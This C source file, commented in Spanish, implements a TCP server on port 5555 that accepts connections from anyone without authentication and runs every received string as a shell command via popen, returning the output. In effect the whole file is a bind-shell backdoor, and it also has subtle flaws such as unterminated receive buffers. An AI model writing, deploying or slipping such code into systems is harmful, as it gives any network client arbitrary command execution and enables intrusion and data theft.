#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <arpa/inet.h>

#define PORT 5555

void handle_client(int client_socket) {
    char command[1024];
    char buffer[1024];

    while (1) {
        // Recibir el comando desde el cliente
        recv(client_socket, command, sizeof(command), 0);

        // Verificar si el cliente quiere salir
        if (strcmp(command, "salida") == 0) {
            printf("[*] Cliente se desconectó\n");
            break;
        }

        printf("[*] Comando recibido: %s\n", command);

        // Crear un nuevo proceso para ejecutar el comando
        FILE* fp = popen(command, "r");
        size_t bytesRead = 0;

        while (fgets(buffer + bytesRead, sizeof(buffer) - bytesRead, fp) != NULL) {
        bytesRead = strlen(buffer);
        }
        pclose(fp);

        // Enviar la respuesta al cliente
        send(client_socket, buffer, strlen(buffer), 0);
    }

    // Cerrar la conexión con el cliente
    close(client_socket);
}

int main() {
    int server_socket, client_socket;
    struct sockaddr_in server_address, client_address;
    socklen_t client_address_len = sizeof(client_address);

    // Crear el socket del servidor
    server_socket = socket(AF_INET, SOCK_STREAM, 0);
    if (server_socket == -1) {
        perror("Error al crear el socket");
        exit(EXIT_FAILURE);
    }

    // Configurar la estructura del servidor
    server_address.sin_family = AF_INET;
    server_address.sin_port = htons(PORT);
    server_address.sin_addr.s_addr = INADDR_ANY;

    // Vincular el socket a la dirección y al puerto
    if (bind(server_socket, (struct sockaddr*)&server_address, sizeof(server_address)) == -1) {
        perror("Error al vincular el socket");
        exit(EXIT_FAILURE);
    }

    // Escuchar conexiones entrantes
    if (listen(server_socket, 5) == -1) {
        perror("Error al escuchar");
        exit(EXIT_FAILURE);
    }

    printf("[*] Esperando conexiones en el puerto %d\n", PORT);

    while (1) {
        // Aceptar una conexión entrante
        client_socket = accept(server_socket, (struct sockaddr*)&client_address, &client_address_len);
        printf("[*] Conexión aceptada de %s:%d\n", inet_ntoa(client_address.sin_addr), ntohs(client_address.sin_port));

        // Manejar el cliente en un nuevo proceso
        if (fork() == 0) {
            close(server_socket); // El hijo no necesita el socket del servidor
            handle_client(client_socket);
            exit(EXIT_SUCCESS); // Salir después de manejar el cliente
        } else {
            close(client_socket); // El padre no necesita el socket del cliente
        }
    }

    // Cerrar el socket del servidor (esto no se ejecutará debido al bucle infinito)
    close(server_socket);

    return 0;
}
